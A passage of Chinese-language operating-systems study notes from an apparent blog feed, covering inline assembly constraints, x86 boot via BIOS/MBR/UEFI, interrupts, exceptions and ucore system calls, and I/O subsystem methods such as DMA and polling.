<h3 id="constraints"><a href="#constraints" class="headerlink" title="constraints"></a>constraints</h3><p>常用constraints参数：</p>
<blockquote>
<p>寄存器操作数constraints: r</p>
</blockquote>
<p>添加上这个参数后，操作数将被存储在通用寄存器中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( <span class="string">&quot;movl %%eax, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (myval));</span><br></pre></td></tr></table></figure>
<p>若需指定使用哪个寄存器，可以指定以下限制</p>
<table>
<thead>
<tr>
<th>a</th>
<th>%eax, %ax, %al</th>
</tr>
</thead>
<tbody><tr>
<td>b</td>
<td>%ebx, %bx, %bl</td>
</tr>
<tr>
<td>c</td>
<td>%ecx, %cx, %cl</td>
</tr>
<tr>
<td>d</td>
<td>%edx, %dx, %adl</td>
</tr>
<tr>
<td>S</td>
<td>%esi, %si</td>
</tr>
<tr>
<td>D</td>
<td>%edi, %di</td>
</tr>
</tbody></table>
<blockquote>
<p>内存操作数constraint: m</p>
</blockquote>
<p>当操作数在内存中时，任何对其操作会直接在内存中进行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> (“sidt” %<span class="number">0</span>” : : “m”(loc) );</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>m, v, o</th>
<th>内存单元</th>
</tr>
</thead>
<tbody><tr>
<td>R</td>
<td>任何通用寄存器</td>
</tr>
<tr>
<td>Q</td>
<td>寄存器eax, ebx, ecx,edx之一</td>
</tr>
<tr>
<td>I, h</td>
<td>直接操作数</td>
</tr>
<tr>
<td>E, F</td>
<td>浮点数</td>
</tr>
<tr>
<td>G</td>
<td>任意</td>
</tr>
<tr>
<td>I</td>
<td>常数（0～31）</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>ucore</tag>
      </tags>
  </entry>
  <entry>
    <title>启动 中断 异常 系统调用</title>
    <url>/systems/interrupt-exception-syscall/</url>
    <content><![CDATA[<p> 我们一般打开电脑从启动电源开始，等待开机后再进行具体的操作，运行特定的程序。具体计算机是怎么加载程序并开始运行的呢？在操作系统内核运行之前需要先执行系统初始化软件，完成基本的I/O初始化和引导加载功能，为操作系统内核运行构建环境。之后，操作系统通过中断、异常、系统调用来响应用户的一系列操作。</p>
<a id="more"></a>

<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><p>计算机启动时内存和磁盘布局如下，具体分布情况参考<a href="https://wiki.osdev.org/Memory_Map_(x86)">Memory Map</a>。</p>
<p><img src="https://i.loli.net/2019/07/26/5d3ac38ff22b218900.png"></p>
<h2 id="CPU初始化"><a href="#CPU初始化" class="headerlink" title="CPU初始化"></a>CPU初始化</h2><p>CS寄存器分为可见的选择子<code>selector</code>区域（16位）和不可见的基址<code>base address</code>区域（32位）。 计算机加电后，CPU从物理地址<code>0xFFFFFFF0</code>（由初始化的<code>CS：EIP</code>确定，此时CS和IP的值分别是<code>0xF000</code>和<code>0xFFF0</code>）开始执行。在<code>0xFFFFFFF0</code>这里只是存放了一条跳转指令，通过跳转指令跳到BIOS例行程序起始点。</p>
<p>在16位的8086时代，内存限制在1MB范围内，此时，BIOS的代码固化在EPROM中，且EPROM被编址在1MB内存地址空间的最高64KB中。计算机加电后，CS寄存器初始化为<code>0xF000</code>，IP寄存器初始化为<code>0xFFF0</code>，所以CPU要执行的第一条指令的地址为<code>CS:IP=0xF000:0XFFF0</code>（ <code>Segment:Offset</code>表示） =<code>0xFFFF0</code>（ Linear表示） 。这个地址位于被固化的EPROM中，该地址存储了一条指令，它是一个长跳转指令<code>JMP F000:E05B</code>。这样就开启了BIOS的执行过程。 </p>
<p> 到了32位的80386 CPU时代，内存空间扩大到了4G，多了段机制和页机制。如果仍然把BIOS启动固件编址在<code>0xF0000</code>起始的64KB内存地址空间内，就会把整个物理内存地址空间隔离成不连续的两段，一段是<code>0xF0000</code>以前的地址，一段是1MB以后的地址，这很不协调。为此，intel采用了一个折中的方案：默认将执行BIOS ROM编址在32位内存地址空间的最高端，即位于4GB地址的最后一个64KB内。在PC系统开机复位时，CPU进入实模式，并将CS寄存器设置成<code>0xF000</code>，将<code>shadow register</code>初始化设置为<code>0xFFFF0000</code>，EIP寄存器初始化设置为<code>0x0000FFF0</code>。所以机器执行的第一条指令的物理地址是<code>0xFFFFFFF0</code>。80386的BIOS代码也要和以前8086的BIOS代码兼容，故地址<code>0xFFFFFFF0</code>处的指令还是一条长跳转指令<code>jmp F000:E05B</code>。这个长跳转指令会更新CS寄存器和<code>shadow register</code>，即执行<code>jmp F000:E05B</code>后，CS将被更新成<code>0xF000</code>。表面上看CS其实没有变化，但CS的<code>shadow register</code>被更新为另外一个值了，它的Base域被更新成<code>0x000F0000</code>，此时 <code>PC = 16*CS + IP</code>，形成的物理地址为<code>0x000FE05B</code>系统地址空间只有20位（1MB） ，这就是CPU执行的第二条指令的地址。此时这条指令的地址已经是1M以内了，且此地址不再位于BIOS ROM中，而是位于RAM空间中。由于Intel设计了一种映射机制，将内存高端的BIOS ROM映射到1MB以内的RAM空间里，并且可以使这一段被映射的RAM空间具有与ROM类似的只读属性。所以计算机启动时将开启这种映射机制，让4GB地址空间的最高一个64KB的内容等同于1MB地址空间的最高一个64K的内容，从而使得执行了长跳转指令后，其实是回到了早期的8086CPU初始化控制流，保证了向下兼容。 </p>
<h2 id="BIOS初始化"><a href="#BIOS初始化" class="headerlink" title="BIOS初始化"></a>BIOS初始化</h2><ul>
<li>在实模式下提供基本输入输出方法<ul>
<li>通过中断调用实现</li>
<li>只能在实模式下使用，操作系统不能使用</li>
</ul>
</li>
<li>系统设置信息</li>
<li>开机后自检<ol>
<li>硬件自检POST<ul>
<li>检测系统中内存或显卡等关键部位的存在和工作状态</li>
<li>查找并执行显卡等接口的初始化程序</li>
</ul>
</li>
<li>系统初始化<ul>
<li>检测配置即插即用设备</li>
<li>更新 ESCD 扩展系统配置数据</li>
</ul>
</li>
</ol>
</li>
<li>系统自启动程序等</li>
<li>用户选择引导设备（从什么介质启动）</li>
<li>将<code>bootloader</code>从磁盘的引导扇区加载到内存中<code>0x7c00</code>开始的位置</li>
<li>跳转到<code>bootloader</code>的位置：<code>CS:IP=0000:7c00</code></li>
</ul>
<p>之后，控制权就交给了<code>bootloader</code>。</p>
<h2 id="bootloader"><a href="#bootloader" class="headerlink" title="bootloader"></a>bootloader</h2><p>加载后内存布局如下：</p>
<p><img src="https://i.loli.net/2019/07/26/5d3ac3ed7486f36988.png"></p>
<p>最后，加载程序(bootloader)把控制权交给了操作系统。</p>
<h2 id="BIOS如何读取bootloader"><a href="#BIOS如何读取bootloader" class="headerlink" title="BIOS如何读取bootloader"></a>BIOS如何读取bootloader</h2><p>BIOS先读取主引导扇区(又称主引导记录)代码，主引导扇区代码再读取活动分区的引导扇区代码，再由引导扇区代码读取文件系统的加载程序。</p>
<blockquote>
<p>BIOS为什么没有直接从磁盘读入操作系统内核映像？</p>
</blockquote>
<p>BIOS完成硬件初始化和自检后，会根据CMOS中设置的启动顺序启动相应的设备，这里假定按顺序系统要启动硬盘。但此时，文件系统并没有建立，BIOS也不知道硬盘里存放的是什么，所以BIOS无法直接启动操作系统。另外一个硬盘可以有多个分区，每个分区都有可能包括一个不同的操作系统，BIOS也无从判断应该从哪个分区启动，所以对待硬盘，所有的BIOS都是读取硬盘的0磁头、0柱面、1扇区的内容，然后把控制权交给这里面的MBR (Main Boot Record）。</p>
<blockquote>
<p>BIOS读取主引导记录的过程</p>
</blockquote>
<ol>
<li>BIOS加电自检。BIOS执行内存地址为<code>FFFF:0000H</code>处的跳转指令，跳转到固化在ROM中的自检程序处，对系统硬件（包括内存）进行检查。</li>
<li>读取主引导记录（MBR）。当BIOS检查到硬件正常并与CMOS中的设置相符后，按照CMOS中对启动设备的设置顺序检测可用的启动设备。BIOS将相应启动设备的第一个扇区（也就是MBR扇区）读入内存地址为<code>0000:7C00H</code>处。</li>
<li>检查<code>0000:7DFEH-0000:7DFFH</code>（MBR的结束标志位）是否等于<code>55AAH</code>，若不等于则转去尝试其他启动设备，如果没有启动设备满足要求则显示”NO ROM BASIC”然后死机。</li>
<li>当检测到有启动设备满足要求后，BIOS将控制权交给相应启动设备。启动设备的MBR将自己复制到<code>0000:0600H</code>处，然后继续执行。</li>
<li>根据MBR中的引导代码启动<a href="https://zh.wikipedia.org/wiki/%E5%BC%95%E5%AF%BC%E7%A8%8B%E5%BA%8F">引导程序</a>。</li>
</ol>
<p>事实上，BIOS不仅检查<code>0000:7DFEH-0000:7DFFH</code>（MBR的结束标志位）是否等于<code>55AAH</code>，往往还对磁盘是否有写保护、主引导扇区中是否存在活动分区等进行检查。如果发现磁盘有写保护，则显示磁盘写保护出错信息；如果发现磁盘中不存在活动分区，则显示类似如下的信息“Remove disk or other media Press any key to restart”。</p>
<p>标准MBR结构如下：</p>
<table>
<thead>
<tr>
<th>地址（十进制）</th>
<th>描述</th>
<th>长度（字节）</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>代码区</td>
<td>440（最大446）</td>
</tr>
<tr>
<td>440</td>
<td>选用磁盘标志</td>
<td>4</td>
</tr>
<tr>
<td>444</td>
<td>一般为空值; 0x0000</td>
<td>2</td>
</tr>
<tr>
<td>446</td>
<td>标准MBR分区表规划（四个16 byte的主分区表入口）</td>
<td>64</td>
</tr>
<tr>
<td>510</td>
<td>MBR有效标志：0x55AA</td>
<td>2</td>
</tr>
</tbody></table>
<h2 id="系统启动规范"><a href="#系统启动规范" class="headerlink" title="系统启动规范"></a>系统启动规范</h2><p><strong>BIOS</strong> 固化到计算机主板上的程序(系统设置、自检程序和系统自启动程序)</p>
<ul>
<li>BIOS-MBR 主引导记录最多支持4个分区，一个分区占用 16字节，四个分区占用 64字节</li>
<li>BIOS-GPT 全局唯一标识分区表，不受4个分区的限制</li>
<li>PXE 网络启动标准，通过服务器下载内核镜像来加载</li>
</ul>
<p><strong>UEFI</strong> 统一可扩展固件接口 目标是在所有平台上一致的操作系统启动服务 会对引导记录进行可信性检查 只有通过可信性检查的才能运行</p>
<blockquote>
<p>UEFI和BIOS的区别</p>
</blockquote>
<p>统一可扩展固件接口 (Unified Extensible Firmware Interface, UEFI) 是一种个人电脑系统规格，用来定义操作系统与系统固件之间的软件界面，作为BIOS的替代方案。</p>
<p>UEFI启动对比BIOS启动的优势有：</p>
<ol>
<li>安全性更强：UEFI启动需要一个独立的分区，它将系统启动文件和操作系统本身隔离，可以更好的保护系统的启动；</li>
<li>启动配置更灵活：EFI启动和GRUB启动类似，在启动的时候可以调用EFIShell，在此可以加载指定硬件驱动，选择启动文件。比如默认启动失败，在EFIShell加载U盘上的启动文件继续启动系统；</li>
<li>支持容量更大：传统的BIOS启动由于MBR的限制，默认是无法引导超过2TB以上的硬盘的。随着硬盘价格的不断走低，2TB以上的硬盘会逐渐普及，因此UEFI启动也是今后主流的启动方式。</li>
</ol>
<h1 id="中断-异常-系统调用"><a href="#中断-异常-系统调用" class="headerlink" title="中断 异常 系统调用"></a>中断 异常 系统调用</h1><p>系统调用（system call）：应用程序主动向操作系统发出的服务请求</p>
<p>异常（exception）：非法指令或其他原因导致当前指令执行失败（如：内存出错）后的处理请求</p>
<p>中断（hardware interrupt）：来自硬件设备的处理请求</p>
<p><img src="https://i.loli.net/2019/07/26/5d3ad70b4641f40620.png"></p>
<p>无论是发生异常、中断，还是系统调用，都需要由硬件保存现场和中断号，转到内核态，进入中断向量表，查找对应的设备驱动程序地址（异常）、异常服务例程地址（异常），或找到系统调用表，并在其中查找对应的系统调用实现的起始地址。处理完毕之后，再进行现场的切换，回到用户态继续执行程序（如果可以继续的话）。</p>
<h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><table>
<thead>
<tr>
<th></th>
<th>来源</th>
<th>响应方式</th>
<th>处理机制</th>
</tr>
</thead>
<tbody><tr>
<td>中断</td>
<td>外部中断</td>
<td>异步</td>
<td>持续，对用户应用程序是透明的</td>
</tr>
<tr>
<td>异常</td>
<td>应用程序或内核意想不到的行为</td>
<td>同步</td>
<td>杀死或者重新执行意想不到的应用程序指令</td>
</tr>
<tr>
<td>系统调用</td>
<td>应用程序请求操作系统提供服务</td>
<td>同步或异步</td>
<td>等待和持续</td>
</tr>
</tbody></table>
<p>相比于用户态的函数调用，中断和异常的开销是比较大的，因为它们需要进行：</p>
<ul>
<li>特权级的切换</li>
<li>建立内核堆栈</li>
<li>验证参数的合法性（防止对内核的恶意攻击）</li>
<li>内核态需要映射到用户态的地址空间（因为需要访问用户程序的一些内容），因此需要更新页面映射权限</li>
<li>内核态也拥有独立的地址空间，因此TLB会失效</li>
</ul>
<h2 id="中断和异常处理机制"><a href="#中断和异常处理机制" class="headerlink" title="中断和异常处理机制"></a>中断和异常处理机制</h2><p>中断和异常处理需要涉及软件和硬件操作</p>
<p>硬件：在CPU初始化时设置中断使能标志</p>
<ul>
<li>依据内部标志或外部中断事件设置中断标志位</li>
<li>依据中断向量表调用相应中断服务例程</li>
</ul>
<p>软件：</p>
<ul>
<li>现场保存(CPU+编译器)</li>
<li>中断服务处理(服务例程)</li>
<li>清楚中断标记(服务例程)</li>
<li>现场恢复(CPU+编译器)</li>
</ul>
<h2 id="中断嵌套"><a href="#中断嵌套" class="headerlink" title="中断嵌套"></a>中断嵌套</h2><p>硬件中断服务例程可被打断</p>
<ul>
<li>不同硬件中断源可能在硬件中断处理时出现</li>
<li>硬件中断服务例程中需要临时禁止中断服务例程</li>
<li>中断请求会保持到CPU做出响应</li>
</ul>
<p>异常服务例程中可被打断</p>
<ul>
<li>异常服务例程执行时可能出现硬件中断</li>
</ul>
<p>异常服务例程可嵌套</p>
<ul>
<li>异常服务例程可能出现缺页</li>
</ul>
<p>在<a href="https://zh.wikipedia.org/wiki/%E5%BC%95%E5%AF%BC%E7%A8%8B%E5%BA%8F">intel 手册</a>中，intel架构总共可用的中断号有256个（从0到255），其中前32个（从0到31）中断号保留给Intel架构内部使用，也就是说这些中断都有其特定的含义而不可被用户更改，而剩余的224（从32到255）个中断则可由用户自定义和实现其具体功能。其中Double Fault即为中断嵌套，对应中断情况如下所示：</p>
<table>
<thead>
<tr>
<th align="center">First Exception</th>
<th align="center">Second Exception</th>
<th align="center">Second Exception</th>
<th>Second Exception</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Benign</td>
<td align="center">Contributory</td>
<td align="center">Page Fault</td>
<td></td>
</tr>
<tr>
<td align="center">Benign</td>
<td align="center">x</td>
<td align="center">x</td>
<td>x</td>
</tr>
<tr>
<td align="center">Contributory</td>
<td align="center">x</td>
<td align="center">Double Fault</td>
<td>x</td>
</tr>
<tr>
<td align="center">Page Fault</td>
<td align="center">x</td>
<td align="center">Double Fault</td>
<td>Double Fault</td>
</tr>
</tbody></table>
<p>从上表中我们可以看到一些嵌套的情况，比如硬件中断“Device Not Available”和系统调用都属于Benign类，因此它们可以和任何其他中断/异常进行嵌套；而Page Fault就不可嵌套。</p>
<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><blockquote>
<p>系统调用的特点</p>
</blockquote>
<ul>
<li>系统调用是操作系统服务的编程接口</li>
<li>通常由高级语言编写（C或C++）</li>
<li>程序访问系统调用通常是通过高层次的API接口而不是直接进行系统调用</li>
<li>3种最常用的应用程序编程接口（API）：<ul>
<li>Win32 API：Windows</li>
<li>POSIX API：UNIX、LINUX、Mac OS X</li>
<li>Java API：用于JAVA虚拟机（JVM），是对实际系统调用的进一步抽象</li>
</ul>
</li>
</ul>
<blockquote>
<p>系统调用的实现</p>
</blockquote>
<ul>
<li>每个系统调用对应一个系统调用号<ul>
<li>系统调用接口根据系统调用号来维护表的索引</li>
</ul>
</li>
<li>系统调用接口调用内核态中的系统调用功能实现，并返回系统调用的状态和结果</li>
<li>用户不需要知道系统调用的实现<ul>
<li>需要设置调用参数和获取返回结果</li>
<li>操作系统接口的细节大部分都隐藏在应用编程接口后</li>
</ul>
</li>
<li>通过运行程序支持的库来管理</li>
</ul>
<blockquote>
<p>系统调用过程中堆栈的切换</p>
</blockquote>
<p>由tss(task state segment)切换不同特权级堆栈</p>
<blockquote>
<p>系统调用与函数调用的区别</p>
</blockquote>
<ul>
<li>汇编指令的区别<ul>
<li>系统调用：使用INT和IRET指令</li>
<li>函数调用：使用CALL和RET指令</li>
</ul>
</li>
<li>安全性的区别<ul>
<li>系统调用有堆栈和特权级的转换过程，函数调用没有这样的过程，系统调用相对更为安全</li>
</ul>
</li>
<li>性能的区别<ul>
<li>时间角度：系统调用比函数调用要做更多和特权级切换的工作，所以需要更多的时间开销</li>
<li>空间角度：在一些情况下，如果函数调用采用静态编译，往往需要大量的空间开销，此时系统调用更具有</li>
</ul>
</li>
</ul>
<h2 id="ucore系统调用分析"><a href="#ucore系统调用分析" class="headerlink" title="ucore系统调用分析"></a>ucore系统调用分析</h2><p>在 ucore 中，执行系统调用前，需要将系统调用的参数储存在寄存器中。<br><code>eax</code>表示系统调用类型，其余参数依次存在 <code>edx</code>, <code>ecx</code>, <code>ebx</code>, <code>edi</code>, <code>esi</code> 中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">int</span> num = tf-&gt;tf_regs.reg_eax;</span><br><span class="line">...</span><br><span class="line">arg[<span class="number">0</span>] = tf-&gt;tf_regs.reg_edx;</span><br><span class="line">arg[<span class="number">1</span>] = tf-&gt;tf_regs.reg_ecx;</span><br><span class="line">arg[<span class="number">2</span>] = tf-&gt;tf_regs.reg_ebx;</span><br><span class="line">arg[<span class="number">3</span>] = tf-&gt;tf_regs.reg_edi;</span><br><span class="line">arg[<span class="number">4</span>] = tf-&gt;tf_regs.reg_esi;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>以下为用户态的系统调用<code>syscall</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">syscall(<span class="keyword">int</span> num, ...) &#123;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, num);</span><br><span class="line">    <span class="keyword">uint32_t</span> a[MAX_ARGS];</span><br><span class="line">    <span class="keyword">int</span> i, ret;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_ARGS; i ++) &#123;</span><br><span class="line">        a[i] = va_arg(ap, <span class="keyword">uint32_t</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    va_end(ap);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;int %1;&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">&quot;=a&quot;</span> (ret)</span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">&quot;i&quot;</span> (T_SYSCALL),</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="string">&quot;a&quot;</span> (num),</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="string">&quot;d&quot;</span> (a[<span class="number">0</span>]),</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="string">&quot;c&quot;</span> (a[<span class="number">1</span>]),</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="string">&quot;b&quot;</span> (a[<span class="number">2</span>]),</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="string">&quot;D&quot;</span> (a[<span class="number">3</span>]),</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="string">&quot;S&quot;</span> (a[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">&quot;cc&quot;</span>, <span class="string">&quot;memory&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>num</code>参数为系统调用号，该函数将参数准备好后，通过 <code>SYSCALL</code> 汇编指令进行系统调用，进入内核态，返回值放在 <code>eax</code> 寄存器，传入参数通过 <code>eax</code> ~ <code>esi</code> 依次传递进去。<br>在内核态中，首先进入 <code>trap()</code> 函数，然后调用 <code>trap_dispatch()</code>进入中断分发，当系统得知该中断为系统调用后，OS调用如下的 <code>syscall</code> 函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">syscall(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> =</span> current-&gt;tf;</span><br><span class="line">    <span class="keyword">uint32_t</span> arg[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">int</span> num = tf-&gt;tf_regs.reg_eax;</span><br><span class="line">    <span class="keyword">if</span> (num &gt;= <span class="number">0</span> &amp;&amp; num &lt; NUM_SYSCALLS) &#123;</span><br><span class="line">        <span class="keyword">if</span> (syscalls[num] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            arg[<span class="number">0</span>] = tf-&gt;tf_regs.reg_edx;</span><br><span class="line">            arg[<span class="number">1</span>] = tf-&gt;tf_regs.reg_ecx;</span><br><span class="line">            arg[<span class="number">2</span>] = tf-&gt;tf_regs.reg_ebx;</span><br><span class="line">            arg[<span class="number">3</span>] = tf-&gt;tf_regs.reg_edi;</span><br><span class="line">            arg[<span class="number">4</span>] = tf-&gt;tf_regs.reg_esi;</span><br><span class="line">            tf-&gt;tf_regs.reg_eax = syscalls[num](arg);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    print_trapframe(tf);</span><br><span class="line">    panic(<span class="string">&quot;undefined syscall %d, pid = %d, name = %s.\n&quot;</span>,</span><br><span class="line">            num, current-&gt;pid, current-&gt;name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数得到系统调用号 <code>num = tf-&gt;tf_regs.reg_eax;</code>，通过计算快速跳转到相应的 <code>sys_</code> 开头的函数，最终在内核态中完成系统调用所需要的功能。</p>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>Operating Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>I/O子系统</title>
    <url>/systems/io/</url>
    <content><![CDATA[<p>为了满足各种要求，计算机的输入/输出设备种类繁多，功能繁杂，速度不一。操作系统通过I/O子系统对I/O设备进行有效的管理。</p>
<p>计算机的输入设备为信息进入计算机的设备，如键盘，鼠标等，输出设备将计算结果展示给用户，如显示器、打印机、喇叭等。输入/输出设备为计算机与外部交换信息的通道。I/O设备种类繁多，其中各设备速度差距悬殊。操作系统通过I/O子系统来管理I/O设备。</p>
<a id="more"></a>

<h1 id="常见设备I-O特征"><a href="#常见设备I-O特征" class="headerlink" title="常见设备I/O特征"></a>常见设备I/O特征</h1><p>常见的接口分为三类，字符设备、块设备和网络设备，访问特征均不一样。</p>
<table>
<thead>
<tr>
<th>设备接口类型</th>
<th>例子</th>
<th>访问特征</th>
<th>I/O命令</th>
</tr>
</thead>
<tbody><tr>
<td>字符设备</td>
<td>键盘、鼠标、串口</td>
<td>以字节为单位顺序访问</td>
<td>文件访问接口</td>
</tr>
<tr>
<td>块设备</td>
<td>磁盘驱动器、磁带驱动器、光驱</td>
<td>均匀的数据块访问</td>
<td>文件系统接口、内存映射</td>
</tr>
<tr>
<td>网络设备</td>
<td>以太网、无线、蓝牙</td>
<td>格式化报文交换</td>
<td>网络报文、网络协议</td>
</tr>
</tbody></table>
<h1 id="进程I-O操作方式"><a href="#进程I-O操作方式" class="headerlink" title="进程I/O操作方式"></a>进程I/O操作方式</h1><p>从进程的角度来看，I/O方式分为三种</p>
<table>
<thead>
<tr>
<th>I/O类型</th>
<th>特点</th>
<th>读写方法</th>
</tr>
</thead>
<tbody><tr>
<td>阻塞I/O</td>
<td>Wait</td>
<td>读写时，进程将进入等待状态，直到设备完成数据处理</td>
</tr>
<tr>
<td>非阻塞I/O</td>
<td>Don’t Wait</td>
<td>读写时立即从read或write系统调用返回，返回值为成功传输字节数；可能不成功</td>
</tr>
<tr>
<td>异步I/O</td>
<td>Tell Me Later</td>
<td>读写数据时，使用指针标记好用户缓冲区，立即返回；稍后内核将填充缓冲区/处理数据并通知用户</td>
</tr>
</tbody></table>
<p>其中阻塞I/O和非阻塞I/O均为同步I/O，这三种I/O操作方式区别主要在于继承发出操作命令后，进程是否等待；操作结果反馈方式。</p>
<h2 id="阻塞I-O"><a href="#阻塞I-O" class="headerlink" title="阻塞I/O"></a>阻塞I/O</h2><p><img src="https://i.loli.net/2019/07/29/5d3ece385e0c459539.png"></p>
<h2 id="非阻塞I-O"><a href="#非阻塞I-O" class="headerlink" title="非阻塞I/O"></a>非阻塞I/O</h2><p><img src="https://i.loli.net/2019/07/29/5d3ece845637559159.png"></p>
<ul>
<li>可能读写不成功，或不一致</li>
</ul>
<h2 id="异步I-O"><a href="#异步I-O" class="headerlink" title="异步I/O"></a>异步I/O</h2><p><img src="https://i.loli.net/2019/07/29/5d3ecea2cd02231797.png"></p>
<h1 id="CPU和设备之间的I-O方式"><a href="#CPU和设备之间的I-O方式" class="headerlink" title="CPU和设备之间的I/O方式"></a>CPU和设备之间的I/O方式</h1><h2 id="连接方式"><a href="#连接方式" class="headerlink" title="连接方式"></a>连接方式</h2><p><img src="https://i.loli.net/2019/07/29/5d3ed14deb10126612.png"></p>
<p>CPU与设备的通信方式：轮询设备、中断和DMA(DMA同时也为传输方式)</p>
<p>设备控制器为CPU和I/O设备间的接口，向CPU提供特殊指令和寄存器，也就是CPU用来控制I/O设备的I/O地址，分为两种：</p>
<p><strong>I/O指令</strong>：通过I/O端口号访问设备寄存器</p>
<ul>
<li>特殊的CPU指令 <code>out 0x21,AL</code></li>
</ul>
<p><strong>内存映射I/O</strong>：设备的寄存器/存储空间被映射到内存物理地址空间中，通过内存load/store指令完成I/O操作</p>
<ul>
<li>MMU设置映射，硬件跳线或程序在启动时设置地址</li>
</ul>
<p><strong>内核I/O结构</strong></p>
<p><img src="https://i.loli.net/2019/07/29/5d3ed90787e7694089.png"></p>
<p><strong>I/O请求生命周期</strong>(异步I/O)</p>
<p><img src="https://i.loli.net/2019/07/29/5d3ed9369cba021402.png"></p>
<p>中断控制中，CPU和外部设备并行工作。</p>
<h2 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h2><p>CPU与设备控制器之间的数据传输分为两种方式：</p>
<blockquote>
<p>程序控制I/O（PIO，Programmed I/O）</p>
</blockquote>
<ul>
<li><p>通过CPU的in/out或者load/store传输所有数据（内存映射）或者memory读写方式，即把device的寄存器，内存等映射到物理内存中；</p>
<p>特点：</p>
<ul>
<li>硬件简单，编程容易</li>
<li>消耗的CPU时间和数据量成正比</li>
</ul>
</li>
<li><p>适用于简单的、小型的设备I/O</p>
</li>
</ul>
<blockquote>
<p>直接内存访问（DMA）</p>
</blockquote>
<ul>
<li>设备控制器可直接访问系统总线</li>
<li>控制器直接与内存互相传输数据</li>
<li>特点：<ul>
<li>设备传输数据不影响CPU</li>
<li>需要CPU参与设置</li>
<li>适用于高吞吐量I/O</li>
</ul>
</li>
</ul>
<p><strong>通过DMA读取磁盘数据例子</strong></p>
<p><img src="https://i.loli.net/2019/07/29/5d3eda9fba29679136.png"></p>
<p>具体步骤：</p>
<ol>
<li>设备驱动收到读取磁盘数据到内存地址X的请求</li>
<li>设备驱动控制磁盘控制器从磁盘读取数据</li>
<li>磁盘控制器初始化DMA传送</li>
<li>磁盘控制器传送数据到DMA控制器</li>
<li>DMA控制器传送C字节数据到内存地址X</li>
<li>DMA控制器完成数据传送后，产生中断请求，通知CPU传送完成</li>
</ol>
<h2 id="通知方式"><a href="#通知方式" class="headerlink" title="通知方式"></a>通知方式</h2><p>操作系统需要了解设备的状态，比如I/O完成时间，I/O操作遇到的错误。</p>
<p>设备通知CPU(I/O操作完成时间、I/O操作是否发生错误、设备状态等)有两种方式：</p>
<ul>
<li>CPU主动轮询</li>
<li>设备中断</li>
</ul>
<p><strong>轮询</strong></p>
<p>处理流程：</p>
<ul>
<li>I/O设备在特定的状态寄存器中放置状态和错误信息</li>
<li>操作系统定期检测状态寄存器</li>
</ul>
<p>特点：</p>
<ul>
<li>简单</li>
<li>I/O操作频繁或不可预测时，开销大和延时长</li>
</ul>
<p><strong>设备中断</strong></p>
<p>处理流程：</p>
<ul>
<li>CPU在I/O之前设置任务参数</li>
<li>CPU在发出I/O请求后，继续执行其他任务</li>
<li>I/O设备处理I/O请求</li>
<li>I/O设备处理完成时，触发CPU中断请求</li>
<li>CPU接收中断，分发到相应中断处理例程</li>
</ul>
<p>特点：</p>
<ul>
<li>处理不可预测事件效果好</li>
<li>开销相对较高</li>
</ul>
<p><img src="https://i.loli.net/2019/11/01/l8bM2GAhkoKOcHt.png"></p>
<p>计算机组成原理中按照控制方式将I/O方式分为</p>
<ul>
<li><p><strong>程序直接控制</strong> CPU直接使用输入/输出指令来控制外部设备</p>
</li>
<li><p><strong>程序中断</strong> 外部设备请求，CPU响应，CPU和外设并行工作</p>
</li>
<li><p><strong>直接存储访问</strong> 专用输入/输出存储器</p>
</li>
<li><p>通道</p>
<p><strong>字节多路通道</strong> 简单的共享通道，分时处理，面向低、中速字符设备</p>
<p><strong>选择通道</strong> 选择一台外设独占整个通道，以成组方式传送数据块，效率高，适合快速设备</p>
<p><strong>数组多路通道</strong> 以上两种方式的结合，效率高，控制复杂</p>
</li>
<li><p>外围处理机</p>
</li>
</ul>
